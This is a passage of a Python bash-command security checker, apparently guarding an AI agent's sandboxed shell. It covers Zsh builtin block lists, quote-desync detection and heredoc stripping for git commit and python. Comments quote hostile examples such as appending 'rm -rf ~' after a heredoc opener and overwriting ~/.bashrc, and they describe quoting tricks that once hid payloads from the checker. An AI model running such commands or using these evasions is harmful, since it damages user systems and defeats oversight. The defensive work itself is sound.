    ``''#`` — the quote delimiter is adjacent to ``#``, not whitespace.
    """
    unquoted = _extract_unquoted_keep_delimiters(command)

    # Also check continuation-joined version: foo\<NL>#bar
    joined = re.sub(
        r"\\+\n",
        lambda m: (
            "\\" * ((len(m.group()) - 1) - 1)
            if (len(m.group()) - 1) % 2 == 1
            else m.group()
        ),
        unquoted,
    )

    # \S immediately before # (not preceded by ${)
    # Using a simpler approach without lookbehind for broader Python compat
    for text in (unquoted, joined):
        for i, ch in enumerate(text):
            if ch != "#" or i == 0:
                continue
            prev = text[i - 1]
            if prev in (" ", "\t", "\n", "\r"):
                continue
            # Exclude ${# (bash string-length syntax)
            if i >= 2 and text[i - 2:i] == "${":
                continue
            return BashSecurityResult(
                safe=False, check_id=CheckID.MID_WORD_HASH,
                message="Command contains mid-word # which is parsed differently by shell-quote vs bash",
            )
    return _SAFE


def _check_zsh_dangerous_commands(command: str) -> BashSecurityResult:
    """Check 20: Zsh-specific dangerous commands that bypass security.

    Blocks ``zmodload``, ``emulate``, ``sysopen``, ``zpty``, ``ztcp``,
    ``fc -e``, and other Zsh builtins that enable raw file/network I/O
    or arbitrary code execution.
    """
    trimmed = command.strip()
    tokens = trimmed.split()
    base_cmd = ""
    for token in tokens:
        # Skip env-var assignments (VAR=value)
        if re.match(r"^[A-Za-z_]\w*=", token):
            continue
        # Skip Zsh precommand modifiers
        if token in _ZSH_PRECOMMAND_MODIFIERS:
            continue
        base_cmd = token
        break

    if base_cmd in _ZSH_DANGEROUS_COMMANDS:
        return BashSecurityResult(
            safe=False, check_id=CheckID.ZSH_DANGEROUS_COMMANDS,
            message=f"Command uses Zsh-specific '{base_cmd}' which can bypass security checks",
        )

    # fc -e allows executing arbitrary commands via editor
    if base_cmd == "fc" and re.search(r"\s-\S*e", trimmed):
        return BashSecurityResult(
            safe=False, check_id=CheckID.ZSH_DANGEROUS_COMMANDS,
            message="Command uses 'fc -e' which can execute arbitrary commands via editor",
        )

    return _SAFE


def _check_comment_quote_desync(command: str) -> BashSecurityResult:
    """Check 22: Quote characters inside # comments desync quote trackers.

    In bash, everything after unquoted ``#`` is a comment — quote characters
    inside are literal. But our quote-tracking helpers don't handle comments,
    so ``'`` or ``"`` after ``#`` can toggle their state and hide subsequent
    dangerous content from validation.
    """
    in_single = False
    in_double = False
    escaped = False

    for i, ch in enumerate(command):
        if escaped:
            escaped = False
            continue

        if in_single:
            if ch == "'":
                in_single = False
            continue

        if ch == "\\":
            escaped = True
            continue

        if in_double:
            if ch == '"':
                in_double = False
            # Single quotes inside double quotes are literal
            continue

        if ch == "'":
            in_single = True
            continue

        if ch == '"':
            in_double = True
            continue

        # Unquoted # — check rest of line for quote chars
        if ch == "#":
            line_end = command.find("\n", i)
            comment_text = command[i + 1:line_end if line_end != -1 else len(command)]
            if re.search(r"""['"]""", comment_text):
                return BashSecurityResult(
                    safe=False, check_id=CheckID.COMMENT_QUOTE_DESYNC,
                    message="Command contains quote characters inside a # comment which can desync quote tracking",
                )
            # Skip to end of line (rest is comment)
            if line_end == -1:
                break
            # Loop will increment past newline on next iteration

    return _SAFE


# ---------------------------------------------------------------------------
# Benign git-commit heredoc detection (task 2468)
# ---------------------------------------------------------------------------

# Heredoc opener with a QUOTED or backslash-escaped delimiter. Only these
# forms suppress parameter/command expansion inside the body, making the
# heredoc content inert literal text fed to the command's stdin. An unquoted
# ``<<EOF`` is intentionally NOT matched here — expansions happen there, so it
# must continue through the normal (blocking) checks.
_GIT_HEREDOC_QUOTED_OPENER_RE = re.compile(
    r"<<-?[ \t]*(?:'(?P<sq>[A-Za-z_][A-Za-z0-9_]*)'"
    r'|"(?P<dq>[A-Za-z_][A-Za-z0-9_]*)"'
    r"|\\(?P<bs>[A-Za-z_][A-Za-z0-9_]*))"
)


def _benign_git_heredoc_sanitized(command: str) -> str | None:
    r"""Detect a canonical ``git commit`` fed by a quoted-delimiter heredoc and
    return an equivalent command with the inert heredoc region removed.

    Recognizes the shape::

        [git <args> &&]* git commit <args> <<'DELIM'
        ...literal message body...
        DELIM

    A single-quoted, double-quoted, or backslash-escaped heredoc delimiter
    suppresses ALL shell expansion in the body, so the body is literal text
    piped to ``git``'s stdin — it cannot separate shell commands, redirect
    files, or smuggle comments. Checks 7/9/10/21/23 therefore false-positive
    on ordinary prose in the body (``count < limit``, ``\;``, ``# Notes``),
    which repeatedly burned dev-agent turns (task 2468, observed during the
    2464 dispatch).

    When the shape matches AND nothing executable trails the opener on the
    same physical line, ONLY the inert heredoc body + closing delimiter are
    stripped and the pure ``git`` command line is returned so the caller can
    re-validate the git arguments themselves (e.g. catching
    ``git commit -F - > ~/.bashrc <<'EOF'``). Returns ``None`` when the command
    is not this exact benign shape — including when ANY executable text
    trails the opener line (``git commit -F - <<'EOF' ; rm -rf ~``) — in which
    case the normal checks apply unchanged to the ORIGINAL command and the
    newline-bearing heredoc is blocked by check 7.

    NOTE (SR-2468 S1): the opener-line remainder is executable in bash, and
    the normal pipeline permits bare ``;``/``&&``/``|``/``&`` sequencing after
    ``git commit`` (check 12 only inspects the ``-m`` message form). So a
    ``prefix + remainder`` reconstruction would NOT be re-blocked and would
    wave the payload through. We therefore fail closed on any opener-line
    remainder rather than reconstruct-and-revalidate: the relief is granted
    strictly to the canonical shape with nothing after the opener.

    Safety constraints (all required):
      * The heredoc delimiter must be quoted or backslash-escaped (inert body).
      * The command part before the heredoc must contain NO command
        substitution (``$(`` / ``${`` / backtick / ``<(``) — this also cleanly
        excludes the ``git commit -m "$(cat <<'EOF' ... )"`` substitution form,
        which is already handled by checks 12/19.
      * No shell-level ``;`` or ``|`` in the git command line (only ``&&``
        chaining of git commands is allowed).
      * Every ``&&``-separated segment before the heredoc must be a ``git``
        command, and the final one must be ``git commit``.
      * The heredoc body must start on the next physical line; the region
        trailing the opener on the SAME line is executable and is re-validated.
      * Nothing but whitespace may follow the closing delimiter line.
    """
    if "<<" not in command:
        return None

    opener = _GIT_HEREDOC_QUOTED_OPENER_RE.search(command)
    if opener is None:
        return None

    # [SR-2468 S5] The regex must fully account for the delimiter token. If the
    # char immediately after the closing quote/escape continues the word
    # (partial/adjacent quoting like <<'E'OF, <<"E"OF, <<E\OF), bash's real
    # delimiter differs from what we captured — bail to the normal checks
    # rather than proceed on a mismodelled delimiter.
    nxt = command[opener.end(): opener.end() + 1]
    if nxt and (nxt.isalnum() or nxt in "_'\"\\"):
        return None

    prefix = command[: opener.start()]

    # No command substitution in the git command line itself. This also
    # excludes the `git commit -m "$(cat <<'EOF' ...)"` substitution form.
    if re.search(r"\$\(|\$\{|`|<\(", prefix):
        return None

    # Only `&&`-chaining of git commands is permitted. Higher-risk `;`/`|`
    # separators at the shell level bail to the normal pipeline.
    if _has_shell_level_char(prefix, ";|"):
        return None

    segments = _split_command_segments(prefix)
    if not segments:
        return None
    for seg in segments:
        if _get_base_command(seg) != "git":
            return None
    if not re.match(r"^git\s+commit\b", segments[-1]):
        return None

    delim = opener.group("sq") or opener.group("dq") or opener.group("bs")
    is_dash = opener.group(0).startswith("<<-")

    tail = command[opener.end():]

    # [SR-2468 S1] The heredoc body begins on the NEXT physical line. Everything
    # on the opener line AFTER the `<<'DELIM'` operator (up to that newline)
    # still executes in bash (`git commit -F - <<'EOF' ; rm -rf ~`). That
    # region is the ONLY reason these attacks pass the guard once the body is
    # stripped. Since the normal pipeline does not re-block bare
    # `;`/`&&`/`|`/`&` after `git commit`, we do NOT strip such a command:
    # fail closed so the original newline-bearing heredoc stays subject to
    # check 7 (newlines). If there is no newline at all, the framing is broken
    # — also fail closed.
    body_nl = tail.find("\n")
    if body_nl == -1:
        return None
    opener_line_rest = tail[:body_nl]
    if opener_line_rest.strip():
        return None
    body_and_after = tail[body_nl:]

    # [SR-2468 S2] Bash-faithful close-delimiter detection: a plain heredoc
    # requires the terminator alone on a line at column 0; the `<<-` form
    # strips leading TABS only (never spaces). The terminator line must be
    # exactly the delimiter — no leading spaces, no trailing whitespace.
    if is_dash:
        close_re = r"\n\t*" + re.escape(delim) + r"(?:\n|$)"
    else:
        close_re = r"\n" + re.escape(delim) + r"(?:\n|$)"
    close = re.search(close_re, body_and_after)
    if close is None:
        return None

    suffix = body_and_after[close.end():]
    if suffix.strip():
        return None

    # The opener regex does not know quoting: bash must agree that this `<<`
    # opens a top-level quoted heredoc whose body is exactly what we strip.
    body_start = opener.end() + body_nl + 1
    terminator_start = opener.end() + body_nl + close.start() + 1
    if not _tokenizer_confirms_quoted_heredoc(
        command, opener.start(), body_start, terminator_start
    ):
        return None

    # Canonical benign shape: nothing executable trails the opener, and the
    # body + closing delimiter are inert. Return the pure git command line for
    # normal re-validation of the git arguments themselves.
    return prefix.rstrip()


def _tokenizer_confirms_quoted_heredoc(
    command: str, operator: int, body_start: int, terminator_start: int
) -> bool:
    """True when bash reads a top-level quoted heredoc exactly there.

    The heredoc strippers find their opener with their own scans. Before
    text is removed from the checked command, the shared tokenizer must
    agree - on the whole command - that the ``<<`` at *operator* is live
    syntax, that its delimiter is quoted (so the body is inert) and that
    the body spans *body_start* to *terminator_start*. Otherwise the
    "body" may be code: ``cat $'\\' <<'EOF'`` puts the ``<<`` inside an
    ANSI-C string, and the following lines run.
    """
    scan = _scan_shell(command)
    if scan.error is not None:
        return False
    return any(
        heredoc.operator == operator
        and heredoc.quoted
        and heredoc.top_level
        and heredoc.body_start == body_start
        and heredoc.terminator_start == terminator_start
        and heredoc.terminator_start < len(command)
        for heredoc in scan.heredocs
    )


# ---------------------------------------------------------------------------
# Quoted-delimiter heredoc into a non-shell consumer (task 3121, sandbox-13)
# ---------------------------------------------------------------------------

# Commands whose heredoc body is data or a program in their OWN language
# (``python3 - <<'EOF'``), never shell code. Shells, eval/source, xargs and
# writers other than ``cat`` are deliberately absent: a heredoc into
# sh/bash IS shell code and keeps full scrutiny (check 7 blocks it).
_INERT_HEREDOC_CONSUMERS: frozenset[str] = frozenset([
    "cat", "python", "py", "perl", "ruby", "node", "nodejs",
    "gh", "wc", "sort", "head", "tail", "grep",
])

_HEREDOC_OPENER_RE = re.compile(
    r"<<(?P<dash>-?)[ \t]*"
    r"(?:'(?P<sq>[A-Za-z_][A-Za-z0-9_]*)'"
    r'|"(?P<dq>[A-Za-z_][A-Za-z0-9_]*)"'
    r"|\\(?P<bs>[A-Za-z_][A-Za-z0-9_]*)"
    r"|(?P<bare>[A-Za-z_][A-Za-z0-9_]*))"
)
# All that may follow the opener on its line: plain output redirections to
# literal words. Their targets are validated by check 10 afterwards.
_HEREDOC_OPENER_LINE_REST_RE = re.compile(
    r"(?:[ \t]*[0-9]?>>?[ \t]*[\w./-]+)*[ \t]*"
)
_TIMEOUT_OPTIONS_WITH_VALUE = frozenset({"-s", "-k", "--signal", "--kill-after"})


def _heredoc_consumer(segment: str) -> str:
    """Return the normalised command name that receives a heredoc.

    Strips a path (``.venv/bin/python3``), folds ``python3.12`` to
    ``python`` and looks through a leading ``timeout [opts] DURATION``.
    Returns ``""`` when the command word cannot be determined.
    """
    try:
        tokens = shlex.split(segment)
    except ValueError:
        return ""
    index = 0
    if tokens and tokens[0] == "timeout":
        index = 1
        while index < len(tokens) and tokens[index].startswith("-"):
            if tokens[index] in _TIMEOUT_OPTIONS_WITH_VALUE:
                index += 1
            index += 1
        index += 1  # the duration
    if index >= len(tokens):
        return ""
    name = tokens[index].rsplit("/", 1)[-1]
    if re.fullmatch(r"python[0-9.]*", name):
        return "python"
    return name


def _strip_inert_heredoc_body(command: str) -> str | None:
    """Remove the body of an inert quoted-delimiter heredoc; None if not one.

    Recognises ``<consumer> ... <<'DELIM' [> file]`` on the first line,
    followed by a literal body and a ``DELIM`` line, where the consumer is in
    ``_INERT_HEREDOC_CONSUMERS``. A quoted (or backslash-escaped) delimiter
    stops the shell from expanding anything in the body, so the body cannot
    run shell code or redirect files; for these consumers it is data or
    their own-language program - the same thing ``python3 -c '...'`` passes
    as an argument. Checks 7/9/22/23 used to fire on ordinary body text
    (newlines, ``<``, ``#``), which left ``python3 - <<'EOF'`` with no
    permitted form.

    Returns the command with ONLY the body and terminator line removed.
    The opener line is returned for normal checking, and anything after the
    terminator is kept (on its own line, so check 7 still blocks it).
    Returns None - the command is checked unchanged - when the delimiter is
    unquoted (the body is expanded), the consumer is a shell or unknown,
    the first line holds more than one heredoc, a substitution, an open
    quote or anything but redirections after the opener, or the terminator
    is missing.
    """
    first_newline = command.find("\n")
    if first_newline < 0 or "<<" not in command[:first_newline]:
        return None
    line = command[:first_newline]

    # Shell-level scan of the opener line.
    opener_positions: list[int] = []
    in_single = in_double = False
    index = 0
    while index < len(line):
        ch = line[index]
        if ch == "\\" and not in_single:
            index += 2
            continue
        if in_single:
            in_single = ch != "'"
        elif in_double:
            if ch in "$`":
                return None
            in_double = ch != '"'
        elif ch == "'":
            in_single = True
        elif ch == '"':
            in_double = True
        elif ch == "`" or line.startswith("$(", index) or line.startswith(
            "<(", index
        ) or line.startswith(">(", index):
            return None
        elif line.startswith("<<<", index):
            index += 3
            continue
        elif line.startswith("<<", index):
            opener_positions.append(index)
            index += 2
            continue
        index += 1
    if in_single or in_double or len(opener_positions) != 1:
        return None

    opener_pos = opener_positions[0]
    opener = _HEREDOC_OPENER_RE.match(line, opener_pos)
    if opener is None or opener.group("bare"):
        return None
    following = line[opener.end():opener.end() + 1]
    if following and (following.isalnum() or following in "_'\"\\"):
        return None  # <<'E'OF style: the real delimiter differs from ours
    if not _HEREDOC_OPENER_LINE_REST_RE.fullmatch(line[opener.end():]):
        return None

    prefix = line[:opener_pos]
    consumer = _heredoc_consumer(prefix[_last_segment_start(prefix):])
    if consumer not in _INERT_HEREDOC_CONSUMERS:
        return None

    delim = opener.group("sq") or opener.group("dq") or opener.group("bs")
    leading_tabs = r"\t*" if opener.group("dash") else ""
    terminator = re.compile(
        rf"^{leading_tabs}{re.escape(delim)}$", re.MULTILINE
    ).search(command, first_newline + 1)
    if terminator is None:
        return None
    if not _tokenizer_confirms_quoted_heredoc(
        command, opener_pos, first_newline + 1, terminator.start()
    ):
        return None
    after = command[terminator.end():]
    return line + after if after.strip() else line


def _check_quote_structure(command: str) -> BashSecurityResult:
    """Check 25: the shared tokenizer must reach a clean end state.

    An unterminated quote, substitution or ``${...}``, or a construct the
    tokenizer does not model (see _scan_shell), means the checker cannot
    tell quoted text from code. Guessing is how ``$'\\''`` hid payloads
    (BS3121-01), so the command is refused with the reason instead.
    """
    error = _scan_shell(command).error
    if error is None:
        return _SAFE
    return BashSecurityResult(
        safe=False, check_id=CheckID.UNPARSEABLE_QUOTING,
        message=(
            f"Command quoting could not be parsed ({error}); the checker "
            "cannot tell quoted text from code. Close every quote and "
            "substitution, or put the text in a file"
        ),
    )


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def check_bash_command(command: str) -> BashSecurityResult:
    """Run all bash security checks on *command*.

    Returns a ``BashSecurityResult``. If ``result.safe`` is False the
    command MUST be rejected — do NOT pass it to subprocess.

    The checks are ordered from cheapest to most expensive for early-out
    performance.
    """
    if not command or not command.strip():
        return _SAFE

    # Length cap (sandbox-07): checked before any scan so an oversized
    # command is refused in constant-ish time with an actionable reason.
    command_bytes = len(command.encode("utf-8", errors="surrogatepass"))
    if command_bytes > MAX_COMMAND_BYTES:
        result = BashSecurityResult(
            safe=False, check_id=CheckID.COMMAND_TOO_LONG,
            message=(
                f"Command is {command_bytes} bytes, over the "
                f"{MAX_COMMAND_BYTES}-byte limit; write long content to a "
                "file and run a short command that reads it"
            ),
        )
        log.warning(
            "Bash security check %d BLOCKED command: %s — %s",
            result.check_id, command[:120], result.message,
        )
        return result

    # Bash deletes backslash-newline before it tokenizes, so every check
    # reads the joined text: `$`, backslash-newline, `(id)` is `$(id)`
    # (IND3128-01).
    joined = _join_line_continuations(command)
    if not joined.complete:
        result = BashSecurityResult(
            safe=False, check_id=CheckID.UNPARSEABLE_QUOTING,
            message=(
                "Command quoting could not be parsed (line continuations "
                "change the quoting around each other); join the lines"
            ),
        )
        log.warning(
            "Bash security check %d BLOCKED command: %s — %s",
            result.check_id, command[:120], result.message,
        )
        return result
    command = joined.text

    # Canonical `git commit` fed by a quoted-delimiter heredoc: the body is
    # inert literal text piped to git's stdin, so strip it and validate only
    # the real git command line. Prevents checks 7/9/10/21/23 from
    # false-positiving on ordinary prose in the commit body (task 2468).
    sanitized = _benign_git_heredoc_sanitized(command)
    if sanitized is None:
        # Same idea for `python3 - <<'EOF'`, `cat > f <<'EOF'` and other
        # non-shell consumers of a quoted-delimiter heredoc (sandbox-13).
        sanitized = _strip_inert_heredoc_body(command)
    if sanitized is not None:
        command = sanitized

    base_cmd = _get_base_command(command)
    unquoted = _extract_unquoted(command)

    # Run each check in priority order. First failure wins.
    checks: list[BashSecurityResult] = [
        # First: every check below reads the tokenizer's view of quoting,
        # which is meaningless for a command bash would not parse the same
        # way (BS3121-01, fail closed).
        _check_quote_structure(command),
        _check_control_characters(command),
        _check_unicode_whitespace(command),
        _check_incomplete_commands(command),
        _check_ifs_injection(command),
        _check_proc_environ(command),
        _check_heredoc_in_substitution(command),
        _check_comment_quote_desync(command),
        _check_quoted_newline_comment(command),
        _check_newlines(command, unquoted),
        _check_command_substitution(unquoted),
        _check_redirections(command, unquoted),
        _check_dangerous_variables(unquoted),
        _check_shell_metacharacters(command, unquoted),
        _check_obfuscated_flags(command, base_cmd),
        _check_git_commit_substitution(command, base_cmd),
        _check_jq_exploits(command, base_cmd),
        _check_backslash_escaped_whitespace(command),
        _check_backslash_escaped_operators(command),
        _check_mid_word_hash(command),
        _check_brace_expansion(command, unquoted),
        _check_zsh_dangerous_commands(command),
        # Last, so every verdict and check id the checks above already gave
        # is unchanged; this only adds blocks for substitutions hidden inside
        # double quotes (sandbox-01).
        _check_double_quoted_substitution(command),
        # Fail closed on substitution-looking text the checks above do not
        # judge as a substitution and the tokenizer cannot prove inert.
        _check_substitution_lookalikes(command),
    ]

    for result in checks:
        if not result.safe:
            log.warning(
                "Bash security check %d BLOCKED command: %s — %s",
                result.check_id, command[:120], result.message,
            )
            return result

    return _SAFE
